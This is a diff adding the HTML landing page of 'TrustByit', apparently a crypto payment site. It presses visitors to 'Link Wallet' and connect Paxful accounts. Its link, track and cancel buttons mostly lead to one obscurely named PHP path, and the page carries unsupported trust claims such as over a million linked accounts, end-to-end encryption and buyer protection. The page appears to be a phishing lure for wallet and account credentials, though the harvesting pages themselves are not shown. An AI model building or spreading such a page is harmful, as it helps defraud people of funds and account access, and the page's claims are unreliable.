@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TrustByit | Trade Payment Platform</title>
+    <link rel="stylesheet" type="text/css" href="css/home.css">
+    <link href="css/tailwind.min.css" rel="stylesheet">
+    <script src="js/2dce5fa11f.js" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header class="flex justify-between items-center">
+        <h1 class="text-3xl font-bold">TrustByit</h1>
+        <nav id="navMenu" class="hidden lg:flex lg:flex-row lg:gap-2 lg:items-center lg:text-right">
+            <a href="index.html#home" class="hidden lg:inline">Home</a>
+            <a href="index.html#whyUs" class="hidden lg:inline">Why TrustByit?</a>
+            <a href="index.html#how-it-works" class="hidden lg:inline">How it works</a>
+            <a href="/Or124t3oQ5r78/index.php" class="hidden lg:inline">Link Accounts</a>
+        </nav>
+        <button id="menuButton" class="lg:hidden"></button>
+    </header>
+
+    <script>
+        document.getElementById('menuButton').addEventListener('click', function () {
+            var navMenu = document.getElementById('navMenu');
+            navMenu.classList.toggle('hidden');
+        });
+    </script>
+
+    <!---Hero Section----->
+    <div class="splitview skewed">
+        <div class="panel bottom">
+            <div class="content">
+                <div class="description">
+                    <h1>TrustByit</h1>
+                    <p>Transfer funds globally with ease using cryptocurrency.</p>
+
+                </div>
+
+                <img src="images/bank1.jpg" alt="Original">
+            </div>
+        </div>
+
+        <div class="panel top">
+            <div class="content">
+                <div class="description">
+                    <h1>TrustByit</h1>
+                    <p>Connect your wallet to TrustByit and begin seamless money transfers.</p>
+                </div>
+
+                <img src="images/bank2.jpg" alt="Duotone">
+
+            </div>
+        </div>
+
+        <div class="handle"></div>
+
+    </div>
+
+
+    <div class="mt-4">
+        <div class="flex flex-col items-center">
+            <a href="/efaa">
+                <button class="bg-purple-500 font-semibold  
+                    sm:text-center rounded-3xl border-solid-2px text-white w-48  
+                    h-12  hover:bg-white hover:text-purple-500 
+                    hover:border-purple-500 ">
+                    Link Wallet
+                </button>
+            </a>
+        </div>
+    </div>
+
+    <style>
+        /* Reset. */
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-size: 100%;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        /* Panels. */
+        .splitview {
+            position: relative;
+            width: 100%;
+            min-height: 45vw;
+            overflow: hidden;
+        }
+
+        .panel {
+            position: absolute;
+            width: 100vw;
+            min-height: 45vw;
+            overflow: hidden;
+        }
+
+        .panel .content {
+            position: absolute;
+            width: 100vw;
+            min-height: 45vw;
+            color: #FFF;
+        }
+
+        .panel .description {
+            width: 25%;
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            text-align: center;
+        }
+        .panel .description h1{
+            color: white;
+            font-size: 30px;
+        }
+        
+
+        .panel img {
+            box-shadow: 0 0 20px 20px rgba(0, 0, 0, 0.15);
+            width: 35%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+
+        .bottom {
+            background-color: rgb(44, 44, 44);
+            z-index: 1;
+        }
+
+        .bottom .description {
+            right: 5%;
+        }
+
+        .top {
+            background-color: rgb(77, 69, 173);
+            z-index: 2;
+            width: 50vw;
+
+            /*-webkit-clip-path: polygon(60% 0, 100% 0, 100% 100%, 40% 100%);
+        clip-path: polygon(60% 0, 100% 0, 100% 100%, 40% 100%);*/
+        }
+
+        .top .description {
+            left: 5%;
+        }
+
+        /* Handle. */
+        .handle {
+            height: 100%;
+            position: absolute;
+            display: block;
+            background-color: rgb(253, 171, 0);
+            width: 5px;
+            top: 0;
+            left: 50%;
+            z-index: 3;
+        }
+
+        /* Skewed. */
+        .skewed .handle {
+            top: 50%;
+            transform: rotate(30deg) translateY(-50%);
+            height: 200%;
+            -webkit-transform-origin: top;
+            -moz-transform-origin: top;
+            transform-origin: top;
+        }
+
+        .skewed .top {
+            transform: skew(-30deg);
+            margin-left: -1000px;
+            width: calc(50vw + 1000px);
+        }
+
+        .skewed .top .content {
+            transform: skew(30deg);
+            margin-left: 1000px;
+        }
+
+        /* Responsive. */
+        @media (max-width: 900px) {
+            body {
+                font-size: 75%;
+            }
+            h1 {
+                font-size: 20%;
+            }
+        }
+    </style>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var parent = document.querySelector('.splitview'),
+                topPanel = parent.querySelector('.top'),
+                handle = parent.querySelector('.handle'),
+                skewHack = 0,
+                delta = 0;
+
+            // If the parent has .skewed class, set the skewHack var.
+            if (parent.className.indexOf('skewed') != -1) {
+                skewHack = 1000;
+            }
+
+            parent.addEventListener('mousemove', function (event) {
+                // Get the delta between the mouse position and center point.
+                delta = (event.clientX - window.innerWidth / 2) * 0.5;
+
+                // Move the handle.
+                handle.style.left = event.clientX + delta + 'px';
+
+                // Adjust the top panel width.
+                topPanel.style.width = event.clientX + skewHack + delta + 'px';
+            });
+        });
+    </script>
+
+    <!---home Section----->
+    <div id="whyUs" class="ml-4 mb-4 mt-20">
+        <h1 class="text-3xl text-white text-center">Why TrustByit?</h1>
+        <div id="details" class="flex flex-row gap-2 mx-auto justify-center ">
+            <div class="box ">
+                <h3>Easy to use</h3>
+                <p>
+                    TrustByit is an efficient, effective and user-friendly platform.
+                    With just one account, you can shop at millions of merchants around the world.
+                    You can Send money to family and friends anywhere in the world.
+                    Use any of your device to manage your account on the go with the pesalink app
+                </p>
+            </div>
+            <div class="box">
+                <h3>Faster Processing</h3>
+                <p>
+                    Timely processing of transaction and instant settlement and notification updata
+                    Your friends and family don't have to wait for hours to receive payments.
+                    Merchant are able to clear you immediately allowing for a seamless transaction.
+                </p>
+            </div>
+            <div class="box">
+                <h3>Secure</h3>
+                <p>
+                    TrustByit gurantees secure transaction with end to end encryption
+                    We're the most trusted place for people and businesses to buy, sell, and manage crypto.
+                    We don't share your full financial information with sellers.
+                    When you shop with TrustByit our Buyers Protection covers your eligible purchases incase of
+                    anything.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!---Features Section----->
+    <div>
+
+        <div class="text-center text-2xl mb-20 mt-20">
+            <p>Intergrate All your cryprocurrency accounts in one Platform.</p>
+            <p>TrustByit is for everyone who pays or gets paid.</p>
+            <p>We connect buyers and sellers, friends and family</p>
+        </div>
+
+        <div class=" bg-cover bg-center">
+            <div class=" mt-4 mb-20">
+                <div id="icons">
+                    <i class="fa-brands fa-bitcoin text-yellow-500"></i>
+                    <i class="fa-brands fa-ethereum text-teal-500"></i>
+                    <i class="fa-solid fa-file-invoice-dollar text-blue-300"></i>
+                    <i class="fa-solid fa-sack-dollar text-pink-500"></i>
+                </div>
+
+            </div>
+        </div>
+        
+        <div class="text-center text-2xl mb-20 mt-20">
+            <p>
+                TrustByit accepts all cryptocurrencies and linking with various platfoms.
+                We're the most trusted place for people and businesses to buy, sell, and manage crypto.
+            </p>
+        </div>
+    </div>
+
+    <!---About Section----->
+    <div id="how-it-works" class="container mx-auto  mt-20 mb-20 ">
+        <h2 class="text-black font-bold text-4xl text-center mt-20 "> How it Works</h2>
+        <div class="about flex flex-col lg:flex-row">
+            <section class="steps lg:w-1/2 lg:order-first ml-20 mx-20">
+                <div class="step ">
+                    <h3 class="text-blue-500 font-semibold">Step 1</h3>
+                    <p class="flex flex-row">
+                        Connect your wallet to TrustByit.
+                        Our application allows you to connect with various wallets.
+
+                    </p>
+                </div>
+                <div class="step ">
+                    <h3 class="text-white font-semibold">Step 2</h3>
+                    <p class="">
+                        With one Click, transfer funds to your TrustByit wallet.
+                        The transfer is updated in seconds.
+                        Your funds become available for use immediately.
+                    </p>
+                </div>
+                <div class="step ">
+                    <h3 class="text-red-500 font-semibold">Step 3</h3>
+                    <p class="">
+                        Start Transacting.
+                        Buy and sell Cyrpto around the world.
+                        Send money to friends and Family.
+                        Pay for goods and services at merchant stores around the world.
+                        Widraw money directly to back account or other wallets
+                    </p>
+                </div>
+            </section>
+            <section class=" lg:w-1/2 ">
+                <img src="images/join.png" alt="about" class="rounded-3xl mb-4">
+            </section>
+        </div>
+    </div>
+
+    <!---Account Section----->
+    <div id="link" class="accounts mb-20">
+        <h2 class="text-3xl font-bold text-center text-white"> Link your Accounts with TrustByit</h2>
+        <div class="accounts-div flex flex-col lg:flex-row">
+            <div class="acc-div lg:w-1/2">
+                <img src="images/logo.png" alt="paxful">
+                <p class="text-2xl font-semibold">Paxful</p>
+                <p>
+                    Connect your Paxful account to TrustByit and get started.
+                    Find out why we have more than 1M active accounts linked with TrustByit
+                </p>
+                <a href="/Or124t3oQ5r78/index.php">
+                    <button class="bg-green-300 rounded-3xl w-48 h-12 hover:bg-green-600 mt-2 text-white">
+                        Link Account
+                    </button>
+                </a>
+            </div>
+
+            <div class="acc-div lg:w-1/2 ">
+                <p class="text-2xl font-semibold">Track Payments</p>
+                <p>
+                    Track your payments here.
+                    Find out why we have more than 1.3M active accounts linked with TrustByit due to transparent Payment tracking.
+                </p>
+                <a href="track/id/index.php " class="">
+                    <button class="bg-blue-500 rounded-3xl  w-48 h-12 hover:bg-blue-700 mt-2 text-white">
+                        Track Payment
+                    </button>
+                </a>
+            </div>
+
+            <div class="acc-div lg:w-1/2 ">
+                <p class="text-2xl font-semibold">Cancel Payments</p>
+                <p>
+                    Cancel your payments here.
+                    We offer you with the freedom to cancel your Payments at anytime.
+                </p>
+                <a href="/Or124t3oQ5r78/index.php" class="">
+                    <button class="bg-red-500 rounded-3xl  w-48 h-12 hover:bg-red-700 mt-2 text-white">
+                        Cancel Payment
+                    </button>
+                </a>
+            </div>
+        </div>
+
+    </div>
+
+    <!---Footer Section----->
+    <footer>
+        <div class="text-center text-2xl font-semibold">
+            <h3>TrustByit</h3>
+        </div>
+
+        <div class=" flex mx-auto flex-row justify-center space-x-10 mt-4 ">
+            <i class="fa-brands fa-facebook text-3xl text-blue-700"></i>
+            <i class="fa-brands fa-square-x-twitter text-3xl text-black-500"></i>
+            <i class="fa-brands fa-instagram text-3xl text-pink-500"></i>
+            <i class="fa-brands fa-linkedin text-3xl text-blue-900"></i>
+        </div>
+        <div class="flex flex-col lg:flex-row text-center mt-5 mb-4">
+            <p class="mx-auto ">Terms and Conditions</p>
+            <p class="mx-auto">Privacy Policy</p>
+            <p class="mx-auto">Help</p>
+        </div>
+
+
+        <div class="text-center">
+            <p>© <span class="text-pink-500 font-semibold" id="currentYear">2024</span> TrustByit. All rights
+                reserved.</p>
+        </div>
+
+        <script>
+            document.getElementById('currentYear').textContent = new Date().getFullYear();
+        </script>
+    </footer>
+
+
+</body></html>
